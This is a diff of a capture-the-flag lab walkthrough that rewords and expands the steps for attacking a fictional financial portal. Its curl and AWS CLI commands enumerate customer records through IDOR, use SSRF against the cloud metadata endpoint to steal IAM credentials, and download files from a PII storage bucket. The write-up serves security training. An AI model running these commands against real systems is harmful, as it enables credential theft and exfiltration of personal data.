@@ -6,33 +6,34 @@
 
 ## Summary
 
-1. **Step 1 - IDOR Enumeration**: Enumerate all customer data using file_id parameter
-2. **Step 2 - SSRF Role Name Extraction**: Force v1 API to access IMDS via source parameter
-3. **Step 3 - IMDSv1 Credential Theft**: Steal AWS temporary credentials
-4. **Step 4 - IAM Permission Check**: Verify permissions of stolen credentials
-5. **Step 5 - S3 Data Exfiltration**: Download sensitive customer data
+1. **Step 1 - IDOR Enumeration**. Enumerate all customer data using file_id parameter
+2. **Step 2 - API Response Analysis**. Discover internal_source field and test SSRF parameter
+3. **Step 3 - SSRF to Extract Role Name**. Force v1 API to access IMDS using source parameter
+4. **Step 4 - IMDSv1 Credential Theft**. Obtain AWS temporary credentials
+5. **Step 5 - Credential Validation & IAM Permission Check**. Verify stolen credential permissions
+6. **Step 6 - S3 Data Exfiltration**. Download sensitive customer data
 
 ## Detailed Walkthrough
 
 ### Step 1: IDOR Enumeration
 
-When you visit the gateway URL, the portal looks like this:
+Access the gateway URL to see the following portal.
 
 ![Prime Financial Customer Portal](./assets/legacy-bridge-initial-screen.png)
 
-Set gateway URL as environment variable:
+Set the gateway URL as an environment variable.
 
 ```bash
 GW=http://<gateway-ip>
 ```
 
-Verify API status:
+Verify the API portal is working normally.
 
 ```bash
 curl -s $GW/api/v5/status
 ```
 
-Enumerate customer data by changing file_id:
+Enumerate all customer data by changing the file_id parameter.
 
 ```bash
 curl -s "$GW/api/v5/legacy/media-info?file_id=1"
@@ -40,29 +41,47 @@ curl -s "$GW/api/v5/legacy/media-info?file_id=2"
 curl -s "$GW/api/v5/legacy/media-info?file_id=3"
 ```
 
-Look for in the response:
-- `customer_name`: Customer name
-- `application_id`: Application ID
-- `internal_source`: v1 backend URL
+Examine each response to discover.
+- `customer_name`. Customer name
+- `application_id`. Application ID
+- `file_name`. File name
+- `internal_source`. v1 backend URL (example: `http://10.10.2.X/api/v1/...`)
 
 ---
 
-### Step 2: SSRF Role Name Extraction
+### Step 2: API Response Analysis
 
-Get IAM role name from IMDS:
+The `internal_source` field in Step 1 responses exposes **v1 backend URLs**. This signals that the API processes these URLs.
+
+Considering common web API patterns, functionality that fetches external resources typically uses parameters like `source=`, `url=`, or `fetch=`. The response field name `internal_source` suggests a GET parameter `source=` may exist.
+
+**Test the source parameter.**
+
+```bash
+curl -s "$GW/api/v5/legacy/media-info?file_id=1&source=http://example.com"
+```
+
+Analyzing the response shows that the `backend_response` field returns **example.com's content**. This means the v5 portal is forwarding the source parameter directly to the v1 backend.
+
+**This is an SSRF vulnerability.** You can force the v5 portal to access arbitrary URLs.
+
+---
+
+### Step 3: SSRF to Extract Role Name
+
+Use the source parameter to force IMDS access.
 
 ```bash
 curl -s "$GW/api/v5/legacy/media-info?file_id=1&source=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
 ```
 
-Extract role name from `backend_response` field:
-`legacy-bridge-Shadow-API-Role-<SUFFIX>`
+Extract the role name from the `backend_response` field (format: `legacy-bridge-Shadow-API-Role-<SUFFIX>`).
 
 ---
 
-### Step 3: IMDSv1 Credential Theft
+### Step 4: IMDSv1 Credential Theft
 
-Request temporary credentials using role name:
+Request temporary credentials using the extracted role name.
 
 ```bash
 ROLE="legacy-bridge-Shadow-API-Role-<SUFFIX>"
@@ -70,7 +89,7 @@ ROLE="legacy-bridge-Shadow-API-Role-<SUFFIX>"
 curl -s "$GW/api/v5/legacy/media-info?file_id=1&source=http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"
 ```
 
-Extract from response:
+Extract credentials from the `backend_response` field.
 - `AccessKeyId`
 - `SecretAccessKey`
 - `Token`
@@ -78,9 +97,9 @@ Extract from response:
 
 ---
 
-### Step 4: IAM Permission Check
+### Step 5: Credential Validation & IAM Permission Check
 
-Set environment variables:
+Set the stolen credentials as environment variables.
 
 ```bash
 export AWS_ACCESS_KEY_ID="<AccessKeyId>"
@@ -89,41 +108,35 @@ export AWS_SESSION_TOKEN="<Token>"
 export AWS_DEFAULT_REGION="us-east-1"
 ```
 
-Verify credentials:
+Verify the credentials are valid.
 
 ```bash
 aws sts get-caller-identity
 ```
 
-List IAM policies:
+Check the IAM policies for this role.
 
 ```bash
 aws iam list-role-policies --role-name legacy-bridge-Shadow-API-Role-<SUFFIX>
 ```
 
-Get policy details:
+Get the policy details.
 
 ```bash
 aws iam get-role-policy --role-name legacy-bridge-Shadow-API-Role-<SUFFIX> --policy-name <policy-name>
 ```
 
-Permissions found:
-- s3:ListAllMyBuckets
-- s3:GetBucketLocation
-- s3:ListBucket (prime-pii-vault only)
-- s3:GetObject (prime-pii-vault only)
-
 ---
 
-### Step 5: S3 Data Exfiltration
+### Step 6: S3 Data Exfiltration
 
-List accessible S3 buckets:
+List accessible S3 buckets.
 
 ```bash
 aws s3 ls
 ```
 
-Identify and explore target bucket:
+Identify the target bucket (`prime-pii-vault-*`) and examine its structure.
 
 ```bash
 BUCKET="<prime-pii-vault-XXXX>"
@@ -131,29 +144,30 @@ BUCKET="<prime-pii-vault-XXXX>"
 aws s3 ls s3://$BUCKET/
 ```
 
-Explore directories:
+Explore each directory.
 
 ```bash
 aws s3 ls s3://$BUCKET/applications/
 aws s3 ls s3://$BUCKET/confidential/
 ```
 
-Download flag file:
+Download the flag file.
 
 ```bash
 aws s3 cp s3://$BUCKET/confidential/breach_notice.txt -
 ```
 
-Output contains the flag.
+The flag is included in the output.
 
 ---
 
 ## Key Vulnerabilities
 
-| Step | Vulnerability | Description |
-|------|----------------|-------------|
+| Stage | Vulnerability | Description |
+|-------|----------------|-------------|
 | 1 | IDOR | No access control - all customer data exposed |
-| 2 | SSRF | No URL filtering - arbitrary URL access |
-| 3 | IMDSv1 | No token validation - metadata accessible |
-| 4 | Over-permissive IAM | Shadow-API-Role has full bucket read access |
-| 5 | No monitoring | Anomalous access undetected |
+| 2 | SSRF Discovery | No URL filtering - arbitrary URL access possible |
+| 3 | SSRF Exploitation | IMDSv1 metadata service access |
+| 4 | IMDSv1 | No token validation - credentials exposed |
+| 5 | Excessive IAM Permissions | Shadow-API-Role has full bucket read permissions |
+| 6 | Lack of Monitoring | Anomalous access undetected |
